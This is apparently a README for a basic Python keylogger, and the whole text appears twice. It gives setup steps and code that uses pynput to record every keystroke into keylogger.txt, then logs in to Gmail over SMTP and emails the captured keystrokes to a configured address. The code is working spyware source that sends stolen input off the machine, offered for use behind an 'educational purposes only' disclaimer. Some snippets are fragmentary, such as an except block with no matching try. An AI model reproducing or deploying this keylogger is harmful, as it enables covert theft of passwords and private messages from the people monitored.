OverviewOverview

Modern keyloggers have advanced features that can document the exact date and time of each keystroke, the application in which keystrokes were inputted, and provide user-friendly log displays.

This program is a basic keylogger with limited capabilities, specifically:

    Capturing and storing keystrokes in a file named keylogger.txt
    Sending the file's contents to an email address using a Gmail account without two-factor authentication.

Requirements

This keylogger requires the following modules:

    smtplib (pre-installed in Python)
    ssl (pre-installed in Python)
    pynput (requires installation via pip install pynput)

Setup and Execution

    Clone or download the repository containing the keylogger.py file.

    Install the required modules if not already installed:

    sh

pip install pynput

Configure the email parameters in the keylogger.py file:

python

sender_mail = "user@domain.com"  # Replace with your sender email
receiver_mail = "user@domain.com"  # Replace with your receiver email
password = "passcode"  # Replace with your sender email password

Run the keylogger by navigating to the directory containing keylogger.py and executing the following command in the terminal:

sh

    python keylogger.py

    Terminate the keylogger by pressing the Escape key.

Code Explanation

The keylogger program is divided into several sections:

    Email Setup: Configures the email parameters including sender and receiver email addresses, email password, and SMTP server details.

    python

sender_mail = "user@domain.com"
receiver_mail = "user@domain.com"
password = "passcode"
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""

Writing Keystrokes to a File: A function to append keystrokes to keylogger.txt.

python

def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()

SMTP Server Connection: Establishes a connection to the SMTP server for sending emails.

python

server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)

Keyboard Event Handling: Functions to handle key press and release events.

python

def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write(" ")
        else: 
            temp = repr(key) + " Pressed\n"
            write(temp)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

Starting the Keylogger: Initiates the keyboard listener and sends an email with the logged keystrokes.

python

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

server.sendmail(sender_mail, receiver_mail, message)

Error Handling and Cleanup: Handles any exceptions and closes the SMTP connection.

python

    except Exception as e:
        print("An error occurred:", e)
    finally:
        server.quit()

Important Notes

    Ethical Use: This keylogger is for educational purposes only. Ensure you have permission before using it on any system.
    Security: Using a Gmail account without two-factor authentication is not recommended for security reasons.
    Legal Compliance: Be aware of and comply with all local, state, and federal laws regarding the use of keyloggers.



Modern keyloggers have advanced features that can document the exact date and time of each keystroke, the application in which keystrokes were inputted, and provide user-friendly log displays.

This program is a basic keylogger with limited capabilities, specifically:

    Capturing and storing keystrokes in a file named keylogger.txt
    Sending the file's contents to an email address using a Gmail account without two-factor authentication.

Requirements

This keylogger requires the following modules:

    smtplib (pre-installed in Python)
    ssl (pre-installed in Python)
    pynput (requires installation via pip install pynput)

Setup and Execution

    Clone or download the repository containing the keylogger.py file.

    Install the required modules if not already installed:

    sh

pip install pynput

Configure the email parameters in the keylogger.py file:

python

sender_mail = "user@domain.com"  # Replace with your sender email
receiver_mail = "user@domain.com"  # Replace with your receiver email
password = "passcode"  # Replace with your sender email password

Run the keylogger by navigating to the directory containing keylogger.py and executing the following command in the terminal:

sh

    python keylogger.py

    Terminate the keylogger by pressing the Escape key.

Code Explanation

The keylogger program is divided into several sections:

    Email Setup: Configures the email parameters including sender and receiver email addresses, email password, and SMTP server details.

    python

sender_mail = "user@domain.com"
receiver_mail = "user@domain.com"
password = "passcode"
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""

Writing Keystrokes to a File: A function to append keystrokes to keylogger.txt.

python

def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()

SMTP Server Connection: Establishes a connection to the SMTP server for sending emails.

python

server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)

Keyboard Event Handling: Functions to handle key press and release events.

python

def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write(" ")
        else: 
            temp = repr(key) + " Pressed\n"
            write(temp)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

Starting the Keylogger: Initiates the keyboard listener and sends an email with the logged keystrokes.

python

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

server.sendmail(sender_mail, receiver_mail, message)

Error Handling and Cleanup: Handles any exceptions and closes the SMTP connection.

python

    except Exception as e:
        print("An error occurred:", e)
    finally:
        server.quit()

Important Notes

    Ethical Use: This keylogger is for educational purposes only. Ensure you have permission before using it on any system.
    Security: Using a Gmail account without two-factor authentication is not recommended for security reasons.
    Legal Compliance: Be aware of and comply with all local, state, and federal laws regarding the use of keyloggers.

